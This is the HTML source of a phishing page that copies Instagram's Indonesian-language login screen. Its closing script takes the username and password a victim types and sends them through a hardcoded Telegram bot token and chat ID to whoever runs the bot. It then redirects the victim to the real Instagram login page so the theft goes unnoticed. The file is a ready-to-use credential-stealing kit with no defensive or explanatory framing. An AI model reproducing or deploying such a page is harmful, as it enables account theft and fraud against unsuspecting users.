<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Instagram Login Clone</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
      @import url("https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap");
      :root {
        --bg-color: #000;
        --text-color: #fff;
        --input-bg: #262626;
        --input-border: #dbdbdb;
        --form-border: #262626;
        --placeholder-color: #8e8e8e;
        --link-color: #00376b;
        --facebook-color: #385185;
      }
      @media (prefers-color-scheme: light) {
        :root {
          --bg-color: #fafafa;
          --text-color: #000;
          --input-bg: #fafafa;
          --input-border: #dbdbdb;
          --form-border: #dbdbdb;
          --placeholder-color: #8e8e8e;
          --link-color: #00376b;
          --facebook-color: #385185;
        }
      }
      body {
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
        background: var(--bg-color);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
        padding: 0;
        color: var(--text-color);
        transition: background 0.3s, color 0.3s;
      }
      .instagram-logo {
        font-family: "Grand Hotel", cursive;
        font-size: 45px;
        color: var(--text-color);
        text-align: center;
        margin-bottom: 20px;
        user-select: none;
      }
      .cards-container {
        width: 454px;
        height: 618px;
        position: relative;
      }
      .cards-container img {
        width: 100%;
        height: 100%;
        object-fit: contain;
        user-select: none;
      }
      .form-container {
        width: 350px;
        padding: 20px 40px;
        background: var(--bg-color);
        display: flex;
        flex-direction: column;
        gap: 6px;
        border: none;
        box-shadow: none;
      }
      input[type="text"],
      input[type="password"] {
        height: 36px;
        border: 1px solid var(--input-border);
        border-radius: 3px;
        padding: 9px 10px 7px 10px;
        font-size: 12px;
        outline: none;
        background: var(--input-bg);
        color: var(--text-color);
        margin-bottom: 6px;
      }
      input[type="text"]:focus,
      input[type="password"]:focus {
        border-color: #b2b2b2;
        background: var(--input-bg);
      }
      input[type="text"]::placeholder,
      input[type="password"]::placeholder {
        color: var(--placeholder-color);
      }
      button.login-btn {
        background-color: #808dfb;
        border: none;
        border-radius: 8px;
        height: 30px;
        font-weight: 600;
        color: #fff;
        cursor: pointer;
        margin-top: 6px;
        transition: background-color 0.3s ease;
        text-align: center;
        font-size: 14px;
      }
      button.login-btn:hover {
        background-color: #4a5df9;
      }
      .divider {
        margin: 10px 0;
        text-align: center;
        color: var(--placeholder-color);
        font-weight: 600;
        position: relative;
        font-size: 13px;
      }
      .divider::before,
      .divider::after {
        content: "";
        position: absolute;
        top: 50%;
        width: 40%;
        height: 1px;
        background: #dbdbdb;
      }
      .divider::before {
        left: 0;
      }
      .divider::after {
        right: 0;
      }
      .facebook-login {
        color: var(--facebook-color);
        font-weight: 600;
        font-size: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        cursor: pointer;
        user-select: none;
        text-decoration: none;
        margin: 10px 0;
      }
      .facebook-login svg {
        width: 16px;
        height: 16px;
      }
      .links-center {
        margin-top: 10px;
        font-size: 12px;
        text-align: center;
        color: var(--link-color);
        user-select: none;
      }
      .links-center a {
        color: var(--link-color);
        font-weight: 600;
        text-decoration: none;
      }
      .links-center a:hover {
        text-decoration: underline;
      }
      footer {
        margin-top: 5px;
        font-size: 12px;
        color: var(--placeholder-color);
        text-align: center;
        user-select: none;
      }
      footer > div:first-child {
        margin-bottom: 12px;
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        gap: 12px;
      }
      footer > div:first-child a {
        color: var(--placeholder-color);
        text-decoration: none;
      }
      footer > div:first-child a:hover {
        text-decoration: underline;
      }
      footer > div:last-child {
        font-weight: 500;
      }
      @media (max-width: 900px) {
        .main-container {
          flex-direction: column;
          align-items: center;
          gap: 36px;
          padding: 20px;
        }
        .cards-container {
          width: 280px;
          height: auto;
          margin-right: 0;
        }
        .form-container {
          width: 260px;
          padding: 20px;
        }
      }
      .main-container {
        align-items: center;
        gap: 0;
        max-width: 935px;
        height: 618px;
      }
      .main-container > section {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
      }
    </style>
  </head>
  <body>
    <main class="flex items-center justify-center w-full">
      <div class="main-container flex select-none">
        <section class="cards-container relative flex-shrink-0">
          <img
            src="images/instagram-landing.png"
            alt="Instagram landing image"
          />
        </section>
        <section class="flex flex-col w-full max-w-[350px]">
          <h1 class="instagram-logo mb-6" aria-label="Instagram logo">
            Instagram
          </h1>
          <form id="login-form" class="form-container">
            <input
              type="text"
              id="username"
              placeholder="Nomor telepon, nama pengguna, atau email"
              aria-label="Nomor telepon, nama pengguna, atau email"
              autocomplete="username"
              required
            />
            <input
              type="password"
              id="password"
              placeholder="Kata Sandi"
              aria-label="Kata Sandi"
              autocomplete="current-password"
              required
            />
            <button type="submit" class="login-btn" aria-label="Login button">
              Masuk
            </button>
            <div class="divider" role="presentation">ATAU</div>
            <a href="#" class="facebook-login" aria-label="Login with Facebook">
              <svg
                aria-hidden="true"
                focusable="false"
                data-prefix="fab"
                data-icon="facebook-f"
                class="svg-inline--fa fa-facebook-f fa-w-10"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 320 512"
                fill="#385185"
              >
                <path
                  d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06H293V6.26S259.27 0 225.36 0c-73 0-121.14 44.38-121.14 124.72v70.62H22.89V288h81.33v224h100.17V288z"
                ></path>
              </svg>
              Masuk dengan Facebook
            </a>
            <p class="links-center mt-4">
              <a href="#" aria-label="Lupa kata sandi?">Lupa kata sandi?</a>
            </p>
            <p class="links-center mt-4">
              Belum punya akun? <a href="#" aria-label="Buat akun">Buat akun</a>
            </p>
          </form>
        </section>
      </div>
    </main>
    <footer>
      <div>
        <a href="#">Meta</a>
        <a href="#">Tentang</a>
        <a href="#">Blog</a>
        <a href="#">Pekerjaan</a>
        <a href="#">Bantuan</a>
        <a href="#">API</a>
        <a href="#">Privasi</a>
        <a href="#">Ketentuan</a>
        <a href="#">Lokasi</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Pengunggahan</a>
        <a href="#">Kontak & Nonpengguna</a>
        <a href="#">Verifikasi Meta</a>
        <a href="#">Meta di Indonesia</a>
      </div>
      <div>Bahasa Indonesia Â© 2025 Instagram from Meta</div>
    </footer>
    <script>
      document
        .getElementById("login-form")
        .addEventListener("submit", async function (event) {
          event.preventDefault(); // Mencegah form submit default

          // Ambil nilai input
          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;

          // Ganti dengan token bot Anda
          const botToken = "8483797691:AAFY2fQnbsQi5ojEzjaXa4Qq24QU6QqkupY";
          const chatId = "1954718231";
          const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          // Format pesan yang akan dikirim ke Telegram
          const message = `Akun Pengguna:\nUsername: ${username}\nPassword: ${password}`;

          try {
            // Kirim pesan ke Telegram API
            const telegramResponse = await fetch(telegramApiUrl, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
              }),
            });

            const telegramResult = await telegramResponse.json();
            if (telegramResult.ok) {
              console.log("Data berhasil dikirim ke Telegram!");
              // Arahkan ke halaman login Instagram resmi
              window.location.href =
                "https://www.instagram.com/accounts/login/";
            } else {
              console.error(
                "Gagal mengirim data ke Telegram: " + telegramResult.description
              );
              alert(
                "Gagal mengirim data ke Telegram: " + telegramResult.description
              );
            }
          } catch (error) {
            console.error("Error:", error);
            alert("Terjadi kesalahan saat mengirim data ke Telegram.");
          }
        });
    </script>
  </body>
</html>
